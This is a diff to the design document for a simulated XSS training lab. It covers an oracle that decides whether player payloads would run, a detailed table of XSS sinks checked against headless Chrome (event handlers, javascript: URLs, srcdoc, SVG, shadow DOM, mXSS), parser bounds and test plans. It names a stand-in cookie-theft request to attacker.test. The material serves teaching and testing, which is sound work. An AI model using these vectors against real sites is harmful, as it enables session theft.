@@ -1004,7 +1004,7 @@ four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.
      const key = newId();         // the admin's session: what the payload steals
      const state: LabState = {
        world, marker, key,
-       // The canary is read when the payload runs: a signed-out admin has nothing to steal.
+       // The canary is read once the browser has the page's cookies: a signed-out admin has nothing to steal.
        admin: xssBrowser(world, (r) => citadel(level, state, r), { marker: marker.call, canary: () => state.admin.cookies.get(SESSION) ?? '' }),
      };
      state.admin.cookies.set(SESSION, key); // already signed in
@@ -1016,7 +1016,8 @@ four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.
    `xssOracle(body, marker)` first, before the browser sees the answer, which is unchanged. A rendered page is any
    answer except a followed redirect, of a type a browser renders as a document, and not a download. When the payload
    runs, exactly one request lands in the player's attacker log: `GET http://attacker.test/steal?c=<canary>`, with no
-   Referer.
+   Referer. The canary is read once the browser has stored that page's own `Set-Cookie`: at the visit's next request,
+   or when the visit ends. A `Refresh` hop straight to attacker.test is logged before it.
 3. **Render the preview.** The view shows the marker (escaped), the player's input (escaped, in the lab chrome) and
    one raw value, the preview: `preview = previewFrame(level.results(q), { marker: state.marker.call, title })`, output
    with `<%- preview %>`. Never output the raw fragment anywhere else on the page.
@@ -1030,30 +1031,43 @@ four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.
    nothing fires and no canary arrives. The flag never comes from the preview: what the player sees there is
    decorative.
 
+**Two rules every XSS lab keeps (plan amendments after the E0 review):**
+
+- **Never place player input inside `<script>` or event-handler code, at any level.** The oracle does not parse
+  JavaScript, so it cannot judge JS-string escaping: a marker call inside a JS string or a JS comment counts as running
+  (pinned in `tests/xss.spec.ts`, "the marker inside JavaScript"). Put player input in HTML contexts only (text,
+  attribute values, URLs), where the oracle is exact.
+- **A level whose only fix is a CSP is not a Divine.** Only CSP `sandbox` is modelled; other directives are not
+  evaluated. Divine encodes or sanitizes correctly, and a CSP is defence in depth.
+
 ### What the oracle counts
 
-`xssOracle(html, marker, { insertion?, interact?, sandbox? })` answers
-`{ executes, sinks, reachedMarker, mxss, limited? }`. `executes` is true when a sink whose code contains the marker
-call would run in the page's origin.
+`xssOracle(html, marker, { insertion?, interact?, sandbox?, syntax? })` answers
+`{ executes, sinks, reachedMarker, mxss, limited?, wellFormed? }`. `executes` is true when a sink whose code contains
+the marker call would run in the page's origin. Every row below was checked in headless Chrome 157: about 340 cases in
+both insertion modes, plus XML documents. The only rows that differ are ones a harness cannot drive (opening a
+`<details>` that has no `<summary>`).
 
 | Sink row | Runs (examples) | Does not run (examples) |
 |---|---|---|
-| element (`script`) | `<script>`, `type=module`, a JS MIME type, `src="data:,..."` | `type=text/plain`, `nomodule`, `src=http://...` (its code is not on the page), entities inside an HTML script |
-| attribute (`event-handler`) | `img src=x onerror`, `svg onload`, `body onload`, `autofocus onfocus`, `details open ontoggle` (fire by themselves: trigger `load`); `onmouseover`, `onclick` (trigger `interaction`) | unknown names (`onfoo`), `data-onload`, `onerror` on an element that never fetches, `onfocus` on one that cannot take focus, window events on anything but `body` |
-| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`/`button[formaction]` (interaction), `iframe src` (load); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object data=javascript:`, `meta refresh`, top-level `data:` links; a `data:` frame runs, but `isolated` |
+| element (`script`) | `<script>`, `type=module`, a JS MIME type, `src="data:,..."` (a classic script runs whatever the data type) | `type=text/plain`, a type with parameters, `nomodule`, `src=http://...` (its code is not on the page), entities inside an HTML script |
+| attribute (`event-handler`), on load | `onerror` on a source that fails (`src=x`, a broken `data:` image); `onload` on a `data:` source that decodes, a frame, a style, an `<svg>`, the body; a stylesheet, a preload with `as`, a modulepreload or a prefetch link; a default `<track>`; `autofocus` + `onfocus`; `details open` + `ontoggle`; SMIL `onbegin`/`onend`; CSS animation events with an inline animation and a `@keyframes` rule; `content-visibility: auto` | unknown names (`onfoo`), `data-onload`; `onerror` on a `data:` image that decodes, on an icon link, a bare preload, an embed, an iframe or a text input; a `<track>` without `default`; `onload` on SVG children (`g`, `rect`); window events on anything but `body` |
+| attribute, on interaction | `onmouseover`, `onclick`; `onfocus` on an element that can take focus; transition events | `onfocus` on one that cannot |
+| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`, on `formaction` of a submit button with a form (interaction), on `iframe src` (load); SMIL `href` animation of an SVG link (`<animate attributeName=href values="javascript:...">`, on click); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object`/`embed`, `math href`, `meta refresh`, `base`, top-level `data:` links; `formaction` on `type=button`/`reset`, a text input, or with no form; `attributeName=xlink:href`; a `data:` frame runs, but `isolated` |
 | `srcdoc` | the framed document's own sinks, in the page's origin | a `sandbox` without `allow-scripts`; with `allow-scripts` alone the sinks are `isolated` |
-| SVG (`svg-script`) | `<svg><script>` (entities decoded), SMIL `onbegin`/`onend`, `foreignObject` and MathML `mtext` switching back to HTML | `onload` on SVG children (`g`, `rect`) |
+| SVG (`svg-script`) | `<svg><script>` (entities decoded), `foreignObject` and MathML `mtext` switching back to HTML | scripts inserted by innerHTML |
+| declarative shadow DOM | a page's `<template shadowrootmode=open\|closed>` (any case) on a host that can take one (HTML's valid shadow hosts, a custom element, the body), the first per host: its content is live | innerHTML; an `<a>` host; a second template; any other mode; template content otherwise (inert) |
+| customizable `<select>` | markup inside a select (Chrome 135+ keeps it; parse5 8.0.1 drops it): a second pass reads the page with select renamed, and its sinks count | text and attributes that only mention `<select` |
 | style | none: CSS is never script; `<svg><style><img onerror>` runs only because the img breaks out of foreign content | `<style>`, `style=url(javascript:...)`, `@import 'javascript:'` |
 
 - **The marker** must appear literally in the sink's code, in any quote style, with spaces, or as a method call
-  (`window.hvwa("n")`). The oracle does not parse JavaScript: obfuscation it cannot see is not proof. Another player's
-  marker, or another level's, never counts.
+  (`window.hvwa("n")`), and on a word boundary (`xhvwa(...)` does not count). The oracle does not parse JavaScript:
+  obfuscation it cannot see is not proof, and a marker inside a JS string or comment counts (the first rule above).
+  Another player's marker, or another level's, never counts.
 - **`reachedMarker`** with `executes: false` means the payload reached the page as text: escaped, in a comment, or
   in an attribute. A lab may say so in a note.
 - **`interact`** defaults to true: the admin reads the page and hovers and clicks it. Pass `false` for a victim who
   only loads the page.
-- The rules were checked against headless Chrome 157 on 194 cases, both insertion modes. The cases that differ are
-  ones a harness cannot drive (opening a `<details>` with no `<summary>`; CSS animation events).
 
 ### Variants the labs need
 
@@ -1066,7 +1080,10 @@ call would run in the page's origin.
   `'document'` covers document.write and createContextualFragment. Keep the twin and the shipped script in lock-step:
   one constant, or a spec over a payload corpus. The preview runs the real script: pass
   `previewFrame(pageHtml + script, { hash })`. A prototype-pollution twin merges into a simulated object and never
-  touches the host's `Object.prototype`. (A shared `safeishMerge` helper is engine task E3.)
+  touches the host's `Object.prototype`. (A shared `safeishMerge` helper is engine task E3.) **A twin that throws wrote
+  nothing**, as a client script that throws writes nothing: a twin that decodes the hash fails on a malformed `%` escape,
+  and the page is still judged on its own (the verdict says `domFailed`). A twin that answers anything but
+  `{ html, insertion? }` or undefined is a lab bug, and the action fails.
 - **mXSS (SC-06).** `mxss` is true when a parse, serialize, parse round trip adds a marker sink the first parse did
   not have. The round trip is checked with scripting on, and from a scripting-off parse when the page mentions
   `noscript`. Judge the sanitizer's input with it, because that is what the sanitizer saw. The browser then simply
@@ -1078,10 +1095,14 @@ call would run in the page's origin.
   produces.
 - **Served markup (SC-05, SC-09).** What the admin's browser renders depends on the response headers. No type,
   `text/html`, `application/xhtml+xml`, `image/svg+xml` or XML are rendered; anything else (`application/octet-stream`,
-  `image/png`) and any `Content-Disposition: attachment` are not. XML types are parsed with the HTML parser, as an
-  inline `<svg>` would be. A `Content-Security-Policy: sandbox` applies; other CSP directives are not evaluated. A
-  Divine level escapes; its CSP is defence in depth, never the fix. Per the SC-05 amendment, the real route always
-  sends an inert download, and the payload fires only in the preview.
+  `image/png`) and any `Content-Disposition: attachment` are not. **XML types are read as XML** (`syntax: 'xml'`,
+  `core/xss/xml.ts`), as Chrome 157 reads them. Namespaces decide what an element is: an `<svg>` without `xmlns` is
+  not SVG, and an `<img>` inside SVG is no image. Names are case-sensitive. A not-well-formed document runs only what
+  was read before the error: a script whose end tag was read runs, but the root `<svg>`'s `onload` needs the whole
+  document well-formed. The verdict says `wellFormed`. A DTD's entities are not expanded (a reference to one stops
+  the read). A `Content-Security-Policy: sandbox` applies; other CSP directives are not evaluated. Per the SC-05
+  amendment, the citadel serves the sigil inline inside an HTML page, the real route always sends an inert download,
+  and the payload fires only in the preview.
 - **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
   order (`a`, `area`, `form`, `img`/`srcset`, CSS `url()`/`@import` ...), parsed with scripting off as a mail client
   parses. Build the mail's `links` from it, and classify each URL with `classifySimUrl`. It reports `link` with
@@ -1089,22 +1110,42 @@ call would run in the page's origin.
 
 ### Bounds (`XSS_LIMITS`)
 
-parse5 is synchronous, and its worst inputs are superlinear: one tag with thousands of distinct attributes, and deep
-or misnested trees. So every oracle call is bounded **before** parsing:
+parse5 is synchronous, and its worst inputs are superlinear: one tag with thousands of distinct attributes; deep or
+misnested trees; an unclosed formatting element (`<b>`, `<a>`) rebuilt inside every later block. So every oracle call
+is bounded:
 
-- at most 16 KiB of page (`htmlLength`);
-- at most 1024 tag openers (`tags`, which bounds depth and parse5's per-token scope checks);
-- a round trip only for trees at most 512 deep (parse5 serializes recursively);
-- srcdoc documents 2 deep;
-- one parse budget for the page, its frames and its re-parses;
-- a 250 ms backstop.
+- **Before parsing:** at most 16 KiB of page (`htmlLength`) and 1024 tag openers (`tags`, which bounds depth and
+  parse5's per-token scope checks).
+- **While parse5 builds the tree:** a tree adapter counts every element it creates, rebuilt copies included. The caps
+  are 4096 elements (`elements`) and 128 K characters of attribute text (`attributeText`).
+- **Refusals:** a page over any of these is refused whole and deterministically, `executes: false, limited:
+  'size' | 'tags' | 'nodes'`. A framed document over them is skipped (`'nodes'`, `'srcdoc'` past 2 frames deep).
+- **The mXSS round trip** runs only on trees at most 512 deep (parse5 serializes recursively). Its exact serialized
+  length is computed before it is built. One parse budget covers the page, its frames, the select pass and the round
+  trips (`'budget'`).
+- **Time never changes `executes` or `sinks`.** The page, its framed documents and the select pass are always read
+  whole, which the caps above guarantee finishes. Only the mXSS round trips stop for time: 250 ms after the call began
+  (`timeMs`), checked before each round trip and every 256 elements inside its parse. A late call answers
+  `mxss: false, limited: 'time'` with the same `executes`.
+- **No regex that sees attacker text backtracks.** Trims are index loops and CSS URLs are scanned by hand
+  (`tests/xss.spec.ts`, "stays linear").
 
-A page over the size or tag cap is refused unparsed (`executes: false, limited: 'size' | 'tags'`), so keep citadel
-pages under 16 KiB: cap stored items, and cap uploaded SVG at 16 KiB, not 64. Measured at the caps (Node 22.22,
-parse5 8.0.1): the worst input is one tag with 16 KiB of distinct attributes, about 60 ms per oracle call warm and about
-90 ms cold. A realistic 5 KB lab page takes about 2 ms. Under heavy CPU contention the worst case reached about
-360 ms. A victim action blocks for that long at most: a self-DoS in a single-player loopback lab, like the SQL residual
-in section 4. Verdicts list at most 64 sinks, and every string kept is a copy.
+Keep citadel pages under 16 KiB: cap stored items, and per the amendment keep an SVG sigil at about 12 KiB.
+
+Measured at the caps (Node 22.22, parse5 8.0.1, warm):
+- The worst input is one tag with 16 KiB of distinct attributes, because parse5's own duplicate-attribute check is
+  quadratic. It is read up to three times (the page, the select pass, the round trip) and costs about 60 to 70 ms, or
+  80 to 100 ms cold.
+- The review's inputs are refused early: an unclosed link with a 13 K href copied into 400 blocks in 0.4 ms, and 400
+  formatting elements rebuilt in 300 blocks in 3.3 ms.
+- A realistic 5 KB lab page takes about 1.5 ms.
+
+A victim action blocks for that long at most: a self-DoS in a single-player loopback lab, like the SQL residual in
+section 4.
+
+Verdicts list at most 16 sinks with 80-char details, and `linkSinks` at most 64 URLs. An XSS browser keeps its last 5
+page verdicts, about 30 KiB at worst; this will count in the sim byte budget once that budget is weighted per store.
+Every string kept is a copy.
 
 ### Player safety
 
@@ -1122,13 +1163,16 @@ in section 4. Verdicts list at most 64 sinks, and every string kept is a copy.
 
 ### Testing
 
-- **The guard (`tests/xss.spec.ts`).** It holds the sink matrix, escaped negatives, mXSS corpora, marker reachability,
-  per-player isolation, bounds, `linkSinks` and the preview's attributes. It also guards imports: `core/xss/` imports
+- **The guard (`tests/xss.spec.ts`).** It holds the sink matrix, the Chrome 157 rows (declarative shadow DOM, the
+  select pass, SMIL `href`, precision, XML documents), escaped negatives, mXSS corpora, marker reachability,
+  per-player isolation, the bounds (including the linear-time and mocked-clock cases), `linkSinks` and the preview's
+  attributes. It also guards imports: `core/xss/` imports
   only parse5 and `sim/limits.ts` (the copying clip), with no dynamic `import()`, no network, file system, `vm`,
   `child_process` or code-loading global; parse5 and entities import no Node builtin at all; `core/sim/` never
   reaches `core/xss/`.
-- **The victim wrap (`tests/xss-victim.spec.ts`).** In process: what renders, what fires, the canary, content types,
-  CSP sandbox, the `dom` twin and its hash.
+- **The victim wrap (`tests/xss-victim.spec.ts`).** In process: what renders, what fires, the canary (read after the
+  page's `Set-Cookie`), content types (XML read as XML), CSP sandbox, the `dom` twin, its hash and its failures, and
+  the bound on kept verdicts.
 - **A lab spec**, like XV-01, scripts the exploit as a player would. It reads the marker from the page (put it in
   `<code data-marker>`), sends the link (`POST <lab>/victim/send-link`), reads the canary from the attacker log
   (`attackerHits(html)`, the hit whose URL starts with `XSS_STEAL_URL`), then completes the attack.
